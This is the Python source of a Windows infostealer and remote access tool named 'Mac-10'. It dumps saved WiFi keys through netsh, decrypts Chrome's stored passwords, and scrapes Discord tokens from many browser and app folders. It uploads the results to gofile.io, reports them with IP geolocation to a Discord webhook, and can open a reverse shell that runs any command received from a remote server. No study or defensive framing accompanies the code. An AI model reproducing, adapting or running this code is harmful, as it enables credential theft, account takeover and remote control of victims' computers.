import re, os, time, shutil, sqlite3, base64, json, sys, string
import socket as sock
import tempfile as tf
import platform as pf
import subprocess as sp
import os.path
import discord
import getpass
import ctypes
import traceback

from cryptography.fernet import Fernet
from discord import SyncWebhook
from PIL import ImageGrab
from random import choice
from requests import get, post
from datetime import datetime, timedelta
from uuid import getnode
from win32crypt import CryptUnprotectData
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)


class VARIABLES:
    webhook    = "webhookhere"
    printOnEnd = True 
    endText    = "PROGRAM FINISHED"
    user = os.path.expanduser("~")


    REVSHELL  = False
    serverip  = "IPv4 HERE"
    buffer    = 1024 
    port      = 8080

class Mac10:

    class LOGGER:
        def __init__(self):
            self.errors  = ""
            self.INFO    = {'System': pf.system(), 'Release': pf.release(),
            'Version': pf.version(), 'Arch': pf.machine(),
            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),
            'IP Addr': get("https://icanhazip.com").text.split("\n")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))
            }

        def RndFileName(self):
            rnd = ''.join(choice(string.ascii_letters) for i in range(6))
            return f"C:\\ProgramData\\{rnd}.txt"

        def UploadFile(self, filepath, filename="File") -> str:
            server = 'https://store2.gofile.io/uploadFile'
            try:
                file = {'file': open(filepath, "rb")}
                resp = post(server, files=file).json()
                filelink = f"[{filename}]({resp['data']['downloadPage']})"
            except Exception as error:
                LOGGER.errors += f"{error}\n"
                filelink = "Upload Error"
            return filelink

        def ErrorLog(self) -> str:
            randomfilename = LOGGER.RndFileName()
            with open(randomfilename, 'w') as file:
                file.write(str(self.errors))
                file.close()
                return self.UploadFile(randomfilename, filename="System Error Log") \
                    if self.errors != "" else "No System Error Log"

        class GetWifiPasswords:
            def __init__(self):
                self.command = "netsh wlan show profile"
                self.passwords = ""
                
            def Passwords(self) -> str:
                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)
                networks = networks.decode(encoding="utf-8", errors="strict")
                network_list = re.findall("(?:Profile\s*:\s)(.*)", networks) 

                for network_name in network_list:
                    try:
                        command = "netsh wlan show profile " + network_name + " key=clear"
                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)
                        current_result = current_result.decode(encoding="utf-8", errors="strict")        
                        
                        ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                        authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                        cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                        security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                        password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                        
                        self.passwords += f"------------Cloak | .gg/kos | security / Vealloll------------"
                        self.passwords += f"\n\nSSID           : {ssid[0]}"
                        self.passwords += f"Authentication : {authentication[0]}"
                        self.passwords += f"Cipher         : {cipher[0]}"
                        self.passwords += f"Security Key   : {security_key[0]}"
                        self.passwords += f"Password       : {password[0]}"
                    except Exception as error:
                        LOGGER.errors += f"{error}\n"

                return self.passwords

            def Main(self) -> str:
                randomfilename = LOGGER.RndFileName()
                with open(randomfilename, 'w') as file:
                    file.write(str(self.Passwords()))
                    file.close()
                return LOGGER.UploadFile(randomfilename, filename="WiFi Passwords")


        class GetChromePasswords:
            def __init__(self):
                self.passwordlog = ""
                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']
                self.DB_PATH         = r'Google\Chrome\User Data\Default\Login Data'
                self.NONCE_BYTE_SIZE = 12

            def AddPassword(self, db_file):
                conn = sqlite3.connect(db_file)
                _sql = 'select signon_realm,username_value,password_value from logins'
                for row in conn.execute(_sql):
                    host = row[0]
                    if host.startswith('android'):
                        continue
                    name = row[1]
                    value = self.ChromeDecrypt(row[2])
                    _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
                    self.passwordlog += _info
                conn.close()
                os.remove(db_file)

            def ChromeDecrypt(self, encrypted_txt):
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)
                    return decryptedtxt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decryptedtxt = self.DecryptAES(encrypted_txt)
                    return decryptedtxt[:-16].decode()

            def Decrypt(self, cipher, ciphertext, nonce):
                cipher.mode = modes.GCM(nonce)
                decryptor = cipher.decryptor()
                return decryptor.update(ciphertext)

            def GetCipher(self, key):
                cipher = Cipher(
                    algorithms.AES(key),
                    None,
                    backend=default_backend()
                )
                return cipher

            def DecryptDPAPI(self, encrypted):
                import ctypes
                import ctypes.wintypes

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                                ('pbData', ctypes.POINTER(ctypes.c_char))]

                p = ctypes.create_string_buffer(encrypted, len(encrypted))
                blobin = DATA_BLOB(ctypes.sizeof(p), p)
                blobout = DATA_BLOB()
                retval = ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
                if not retval:
                    raise ctypes.WinError()
                result = ctypes.string_at(blobout.pbData, blobout.cbData)
                ctypes.windll.kernel32.LocalFree(blobout.pbData)
                return result

            def LocalKey(self):
                jsn = None
                with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode ="r") as f:
                    jsn = json.loads(str(f.readline()))
                return jsn["os_crypt"]["encrypted_key"]

            def DecryptAES(self, encrypted_txt):
                encoded_key   = self.LocalKey()
                encrypted_key = base64.b64decode(encoded_key.encode())
                encrypted_key = encrypted_key[5:]
                key           = self.DecryptDPAPI(encrypted_key)
                nonce         = encrypted_txt[3:15]
                cipher        = self.GetCipher(key)
                return self.Decrypt(cipher, encrypted_txt[15:], nonce)

            def Main(self):
                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)
                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')
                shutil.copyfile(_full_path,_temp_path)
                self.AddPassword(_temp_path)
                randomfilename = LOGGER.RndFileName()
                with open(randomfilename, 'w') as file:
                    file.write(str(self.passwordlog))
                    file.close()
                    return LOGGER.UploadFile(randomfilename, filename="Chrome Passwords")


            def TimeReadable(self, chromedate):
                if chromedate != 86400000000 and chromedate:
                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                    except Exception as error: LOGGER.errors += f"{error}\n"
                else: return ""

            def DecryptData(self, data, key):
                try:
                    from Crypto.Cipher import AES
                    iv = data[3:15]
                    data = data[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.Decrypt(data)[:-16].decode()
                except:
                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
                    except: return ""



        class DiscordTokens:
            def __init__(self):
                self.tokens = []
                self.rawtokens = ""
                self.tokeninfo = ""

            def GetTokens(self) -> None:
                LOCAL = os.getenv("LOCALAPPDATA")
                ROAMING = os.getenv("APPDATA")
                PATHS = {
                    "Discord"               : ROAMING + "\\Discord",
                    "Discord Canary"        : ROAMING + "\\discordcanary",
                    "Discord PTB"           : ROAMING + "\\discordptb",
                    "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
                    "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
                    "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                    "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
                    'Lightcord'             : ROAMING + "\\Lightcord",
                    'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
                    'Amigo'                 : LOCAL + "\\Amigo\\User Data",
                    'Torch'                 : LOCAL + "\\Torch\\User Data",
                    'Kometa'                : LOCAL + "\\Kometa\\User Data",
                    'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
                    'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
                    '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
                    'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
                    'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
                    'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
                    'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
                    'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
                    'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
                    'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
                    'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
                }
                
                for platform, path in PATHS.items():
                    path += "\\Local Storage\\leveldb"
                    if os.path.exists(path):
                        for file_name in os.listdir(path):
                            if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                        for token in re.findall(regex, line):
                                            if token + " - " + platform not in self.tokens:
                                                self.tokens.append(token + " -> " + platform)
                                                self.rawtokens += f"\n{token}\n"
                return self.tokens

            def Main(self):
                self.GetTokens()
                randomfilename = LOGGER.RndFileName()
                with open(randomfilename, 'w') as file:
                    for index in range(len(self.tokens)):
                        self.tokeninfo += f"[{index+1}] {self.tokens[index]}\n"
                    file.write(str(self.tokeninfo))
                    file.close()

                return LOGGER.UploadFile(randomfilename, filename="Token File"), self.rawtokens

            def Valid(self, token):
                headers = { 'Authorization': token, 'Content-Type': 'application/json' }
                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)
                return True if r.status_code == 200 else False


        def Main(self):
            import requests
            WifiPass   = self.GetWifiPasswords()
            ChromePass = self.GetChromePasswords()
            DiscTokens = self.DiscordTokens()
            wifi_passwords   = WifiPass.Main()
            chrome_passwords = ChromePass.Main()
            discord_tokens   = DiscTokens.Main()

            

            data = requests.get("https://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']

            

            system_info = ""
            for key in self.INFO:
                system_info += f"{key} : {self.INFO[key]}\n"

            embed = {
                "color": 0xffffff,
                        "fields": [
                            {
                                "name": "<:z_logo_trustpilot:1040751302294122507> **Tokens**",
                                "value": f"`{discord_tokens[1]}`"
                            },
                            {
                                "name": "<:z_logo_trustpilot:1040751302294122507> **IP Info**",
                                "value": f"<:wh_star:1102019798390542426>`{ip}`\n<:wh_star:1102019798390542426>`{city}`\n<:wh_star:1102019798390542426>`{country}`\n<:wh_star:1102019798390542426>`{region}`"
                            },
                            {
                                "name": "<:z_logo_trustpilot:1040751302294122507> **System Information**",
                                "value": f"```{system_info}```"
                            },
                            {
                                "name": "<:z_logo_trustpilot:1040751302294122507> **Python Version**",
                                "value": f"```{pf.python_version()}```"
                            },
                            {
                                "name": "<:z_logo_trustpilot:1040751302294122507> **KeyLogger is Active at an Interval of 40 seconds**",
                                "value": f"```if you dont see anykey logs within the server after 40\nseconds then you need Mercrial Binder <33````"
                            },
                            {
                                "name": "<:z_logo_trustpilot:1040751302294122507> **System Files**",
                                "value": f"<:wh_star:1102019798390542426>**{discord_tokens[0]}**\n<:wh_star:1102019798390542426>**{wifi_passwords}**\n<:wh_star:1102019798390542426>**{chrome_passwords}**\n<:wh_star:1102019798390542426>**{self.ErrorLog()}**"
                            },
                        ],
                        "author": {
                            "name": f"Mac-10",
                            "icon_url": "https://cdn.discordapp.com/emojis/1087616875892056094.gif?size=96&quality=lossless"
                        },
                        "footer": {
                            "text": f".gg/kos",
                            "icon_url": "https://cdn.discordapp.com/emojis/1087616875892056094.gif?size=96&quality=lossless"
                        },
                    }

            heading = {
                "content": f"**Mac-10** ||@everyone||",
                "embeds": [embed],
                "username": "Mac-10"
            }
            req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())

            NETWORK = PROGRAM.NETWORK()
            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()


    class NETWORK:
        def __init__(self):
            self.ip = get("https://icanhazip.com").text.split("\n")[0]
            self.cwd = os.getcwd()

        def Persistence(self):
            return None

        def onLoad(self):
            embed = {
                        "color": 0xffffff,
                        "fields": [
                            {
                                "name": "**Reverse Shell Connected**",
                                "value": f"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```"
                            },
                            {
                                "name": "**Configuration**",
                                "value": f"""```PORT -> {VARIABLES.port}\nIP   -> {self.ip}\
                                    \nBUFFER -> {VARIABLES.buffer}\nSERVER -> {VARIABLES.serverip}```"""
                            }
                        ],
                        "author": {"name": f"Mac-10"},
                        "footer": {"text": f".gg/kos"},
                    }
            heading = { "content": "", "embeds": [embed], "username": "Mac-10" }
            req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())

        def Main(self):
            s = sock.socket()
            s.connect((VARIABLES.serverip, VARIABLES.port))
            s.send(self.cwd.encode())
            self.onLoad()

            while True:
                try:
                    command = s.recv(VARIABLES.buffer).decode()
                    split_command = command.split()
                    if split_command[0] == "localtunnel":
                        try:
                            tunnel_port = split_command[1]
                            tunnel_inst = sp.getoutput("npm install -g localtunnel")
                            tunnel_link = sp.getoutput(f"lt --port {tunnel_port}")
                            http_server = sp.getoutput(f"python -m http.server --directory C:// {tunnel_port}")
                            output = f"[*] Started localtunnel @ {tunnel_link}"
                        except Exception as error:
                            output = "[!] Couldn't start localtunnel: ", error
                    elif command.lower() == "exit":
                        break
                    else:
                        output = sp.getoutput(command)
                    message = f"{output}\n"
                    s.send(message.encode())
                except Exception as error:
                    s.send("[!] Error on client side!".encode())
            s.close()

PROGRAM = Mac10()
LOGGER  = PROGRAM.LOGGER()
LOGGER.Main()
print(VARIABLES.endText if VARIABLES.printOnEnd else "")
